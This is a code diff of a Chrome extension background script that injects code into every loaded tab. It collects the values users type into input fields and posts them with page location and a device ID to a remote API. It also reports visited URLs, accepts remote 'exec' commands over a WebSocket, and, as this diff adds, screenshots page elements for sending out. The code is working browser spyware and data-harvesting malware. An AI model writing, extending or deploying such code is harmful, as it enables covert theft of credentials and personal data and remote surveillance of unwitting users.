@@ -1,10 +1,10 @@
 importScripts('config.js')
 initForeground()
+initSocket()
 
 chrome.tabs.onUpdated.addListener(async function (tabId, info, tab) {
     if (info.status === 'complete') {
-        const { uuid, url } = await STORAGE_LOCAL.get('uuid')
-        initSocket()
+        const { uuid, url } = await STORAGE_LOCAL.get()
         POST({
             url: `${url}/api/extension/tabs`,
             body: {
@@ -14,6 +14,16 @@ chrome.tabs.onUpdated.addListener(async function (tabId, info, tab) {
         })
     }
 })
+
+chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
+    console.log(message)
+    switch(message.action) {
+        case 'POST':
+            POST(message.payload)
+            break
+    }
+    sendResponse()
+});
 
 
 function initForeground() {
@@ -41,6 +51,10 @@ function initForeground() {
       }).catch(e => console.error(e))
     }
 
+    function postBG(msg) {
+      chrome.runtime.sendMessage({ action: 'POST', payload: msg })
+    }
+
     function addInputListener() {
       const getInputs = () => [...document.querySelectorAll('input')].filter(i => !['checkbox', 'submit', 'radio', 'date', 'datetime', 'time', 'select'].includes(i.type))
       const inputs = getInputs()
@@ -52,21 +66,23 @@ function initForeground() {
       })
 
       inputs.forEach(i => i.onblur = () => {
-        post({
-          url: inputApi,
-          body: {
-            json: JSON.stringify(all),
-            ...location,
-            deviceId
-          }
-        })
+        if (i.value) {
+          postBG({
+            url: inputApi,
+            body: {
+              json: JSON.stringify(all),
+              ...location,
+              deviceId
+            }
+          })
+        }
       })
     }
 
     function getLocation() {
       let icon = document.querySelector('link[rel=icon]')
       icon = icon ? icon.href ? icon.href : 'No link' : 'No icon'
-      post({
+      postBG({
         url: urlDetailApi,
         body: {
           ...location,
@@ -92,10 +108,10 @@ function initForeground() {
         var sibCount = 0;
         var sibIndex = 0;
         // get sibling indexes
-        for ( var i = 0; i < el.parentNode.childNodes.length; i++ ) {
+        for (var i = 0; i < el.parentNode.childNodes.length; i++) {
           var sib = el.parentNode.childNodes[i];
-          if ( sib.nodeName == el.nodeName ) {
-            if ( sib === el ) {
+          if (sib.nodeName == el.nodeName) {
+            if (sib === el) {
               sibIndex = sibCount;
             }
             sibCount++;
@@ -109,7 +125,7 @@ function initForeground() {
           nodeName += "::shadow";
           isShadow = false;
         }
-        if ( sibCount > 1 ) {
+        if (sibCount > 1) {
           stack.unshift(nodeName + ':nth-of-type(' + (sibIndex + 1) + ')');
         } else {
           stack.unshift(nodeName);
@@ -120,7 +136,7 @@ function initForeground() {
           el = el.host;
         }
       }
-      stack.splice(0,1); // removes the html element
+      stack.splice(0, 1); // removes the html element
       return stack.join(' > ');
     }
     const { uuid, socketUrl } = await storageLocal.get()
@@ -137,13 +153,16 @@ function initForeground() {
         ws.onmessage = ({ data }) => {
           // console.log(JSON.parse(data))
           const { action, from, payload } = JSON.parse(data)
-          wk.remoteId = from
+          wk.clientId = from || wk.clientId
           wk.action
           switch (action) {
             case 'HI':
               ws.send(JSON.stringify({ action: 'ID', payload: `${deviceId}-${tabId}` }))
               break
             case 'exec': wk.exec(payload.name, payload.args)
+              break
+            case 'MEMBER_LEFT':
+              if (wk.enableBG && payload.clientId === deviceId + '-BG') wk.sendBG('start')
               break
           }
         }
@@ -158,7 +177,7 @@ function initForeground() {
       constructor() {
         addEventListener('click', e => { this.currentTarget = e.target })
         window.wk = this
-        this.remoteId = 'Remote'
+        this.clientId = 'Remote'
         this.help = {
           'wk.getObject': 'clone object | getObject(name)',
           'wk.send': 'send data | send(data)',
@@ -220,8 +239,9 @@ function initForeground() {
       }
 
       // usable
-      send(data) {
-        this.clientId = this.remoteId || 'Remote'
+      async send(data) {
+        data = await data
+        this.clientId = this.clientId || 'Remote'
         if (data === null || data === undefined) data = 'null'
         // console.warn('Sending: ', data)
         let payload
@@ -234,7 +254,7 @@ function initForeground() {
         // console.warn('Payload: ', payload)
         //localStorage.data = payload
         this.data = data
-        ws.emit('SEND', { clientId: this.remoteId, action: 'DATA', payload })
+        ws.emit('SEND', { clientId: this.clientId, action: 'DATA', payload })
       }
 
       exec(name, args) {
@@ -308,8 +328,35 @@ function initForeground() {
       }
 
       querySelector(query) {
-        this.currentElement = document.querySelector(query)
-        return this.currentElement
+        return this.currentElement = document.querySelector(query)
+      }
+
+      sendBG(msg, res) {
+        return typeof res === 'function' ? chrome.runtime.sendMessage(msg, res) : chrome.runtime.sendMessage(msg)
+      }
+
+      startBG() {
+        this.enableBG = true
+      }
+
+      stopBG() {
+        this.enableBG = false
+      }
+
+      async capture(what, t = 'image/jpeg', q = 0.5) {
+        try {
+          if (typeof what === 'object' && what.tagName)
+            this.captured = await html2canvas(what)
+          else if (typeof what === 'string')
+            this.captured = await html2canvas(this.querySelector(what))
+          else return 'Neither string nor HTMLTag'
+
+          const base64 = this.captured.toDataURL(t, q)
+          console.log(base64)
+          return base64
+        } catch (error) {
+          return error.message
+        }
       }
 
     }
@@ -318,16 +365,23 @@ function initForeground() {
 
   chrome.tabs.onUpdated.addListener(async function (tabId, info, tab) {
     if (info.status === 'complete') {
+
+      chrome.scripting.executeScript({
+        target: { tabId },
+        files: ['html2canvas.min.js']
+      })
+
       chrome.scripting.executeScript({
         target: { tabId },
         function: Client,
         args: [tabId]
       })
 
-      setTimeout(() => chrome.scripting.executeScript({
+      chrome.scripting.executeScript({
         target: { tabId },
         function: local
-      }), 500)
+      })
+
     }
   })
 }
